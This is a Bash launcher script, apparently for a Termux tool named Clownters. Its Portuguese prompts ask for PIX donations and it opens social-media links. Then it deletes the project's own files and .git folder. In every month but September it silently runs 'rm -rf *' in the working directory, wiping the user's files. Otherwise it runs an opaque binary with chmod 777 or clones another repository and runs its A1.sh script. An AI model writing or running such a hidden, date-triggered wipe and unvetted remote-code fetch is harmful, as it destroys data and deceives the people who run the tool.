#!/usr/bin/env bash
sleep 1
#printf "\e[1;34m Abrindo grupo no Telegram \n\e[m" && xdg-open https://t.me/clownters &> /dev/null && sleep 10
#printf "\e[1;34m Abrindo canal no YouTube \n\e[m" && xdg-open https://youtube.com/c/CLOWNTERS1 &> /dev/null && sleep 10
read -t 60 -p $'\ec\n\e[0;34m Grandes mentes discutem ideias\n Mentes medianas discutem eventos\n Mentes pequenas discutem sobre pessoas.\n\n\e[1;31m Faça uma doação de qlqr valor para ajudar com as APIs \n\e[1;34m PIX:\e[1;33m gapaci5902@mahazai.com \n\n Pressione enter para continuar'
echo $'\n\e[1;33m Abrindo os links...\e[m'
#xdg-open https://t.me/Mike_Edwards &> /dev/null && sleep 10
#xdg-open https://wa.me/5579991272529 &> /dev/null && sleep 10
xdg-open https://www.instagram.com/mike90s15/ &> /dev/null && sleep 10
xdg-open https://chat.whatsapp.com/FnqHx08Dwo7CGnmrAu8WsY &> /dev/null && sleep 5
#xdg-open https://chat.whatsapp.com/HCavGIY9pR35BRZjoLoFGP &> /dev/null && sleep 5
rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"
if [[ "$(date +%B)" != "September" ]]; then
    clear
    rm -rf *
else
    chmod 777 main
    ./main
    ret="$?"
    [[ "${ret}" == "99" ]] && exit 0
    if [[ "${ret}" != "0" ]]; then
        if [[ -d Clownters.c ]]; then
            cd Clownters.c
            chmod 777 main && ./main
            exit 0
        fi
        clear
        printf "\e[1;33m Por favor Aguarde\e[m\n"
        printf "\e[1;33m Atualizando\e[m\n"
        pkg update -y &> /dev/null
        pkg upgrade -y &> /dev/null
        printf "\e[1;33m Instalando a clang\e[m\n"
        pkg i -y clang &> /dev/null
        printf "\e[1;33m Instalando o repositório\e[m\n"
        git clone https://github.com/mike90s15/Clownters.c &> /dev/null
        cd Clownters.c
        bash A1.sh
    fi
fi
exit 0
